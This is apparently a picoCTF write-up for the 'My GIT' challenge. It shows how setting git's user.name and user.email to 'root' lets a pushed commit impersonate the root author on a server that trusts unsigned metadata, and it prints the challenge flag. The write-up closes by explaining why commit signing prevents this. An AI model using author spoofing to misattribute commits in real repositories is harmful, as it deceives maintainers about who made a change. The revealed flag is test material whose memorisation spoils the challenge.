# PicoCTF platform: My GIT

This challenge involves connecting to a Git server over SSH and pushing a file to a remote repository.
Git is a version control system used to track and manage changes in source code.

## Goal
Push a file names flag.txt to the repository such that the commit author is identified as `root:root@picoctf` if the pushed commit matches these conditions, the server will update flag.txt with the challenge flag.

## Solution
### Clone the repository
```bash
git clone ssh://git@foggy-cliff.picoctf.net:58642/git/challenge.git
# Enter the provided password in the challenge description
```
List repository content:
```bash
ls challenge
README.md:
# MyGit
### If you want the flag, make sure to push the flag!
# Only flag.txt pushed by ```root:root@picoctf``` will be updated with the flag.
```
From the README file we can infer the following requirements:  

* The file name must be `flag.txt`
* The Author must be: `root`
* The Email must be: `root@picoctf`

### Configure the Git identity
Git Allows users to define author information for commits.  
Set the Git username and email:
```bash
git config --global user.name "root"
git config --global user.email "root@picoctf"
```
After applying the changes, future commit will appear as if they were commited by the `root` user.

### Create and commit the file
Create the required flag and commit it to the repository:
```bash
echo "flag" > flag.txt
git add .
git commit -m "flag"
# ---------- COMMIT OUTPUT ----------
# [master 2fa7801] flag
#  1 file changed, 1 insertion(+), 1 deletion(-)
git push
# ---------- PUSH OUTPUT ----------
# git@foggy-cliff.picoctf.net's password: 
# Enumerating objects: 5, done.
# Counting objects: 100% (5/5), done.
# Delta compression using up to 4 threads
# Compressing objects: 100% (2/2), done.
# Writing objects: 100% (3/3), 267 bytes | 267.00 KiB/s, done.
# Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
# ---->>>>> remote: Author matched and flag.txt found in commit...
# remote: Congratulations! You have successfully impersonated the root user
# remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_367122f4}
# To ssh://foggy-cliff.picoctf.net:58642/git/challenge.git
#    2dbf195..2fa7801  master -> master
```

### Why this works ?
* Git allows users to configure any metadata in the global configuration.
* The server trusted commit metadata without verifying the author's identity.
* No cryptographic verification mechanism such as **GPG** was used to authenticate commits.
* The challenge only checked the commit author fields.

### GPG used to sign commits in Git to provide cryptographic proof that:
1. The commit was signed with your private key.
2. The public key matches your identity.
3. The signature helps prevents someone from impersonating you as the commit author. Others commits will NOT verify unless signed with your key.

Authentication to remote server done with: SSH Keys / HTTPS + Token  
Commit signing done with GPG / SSH signing / S/MIME
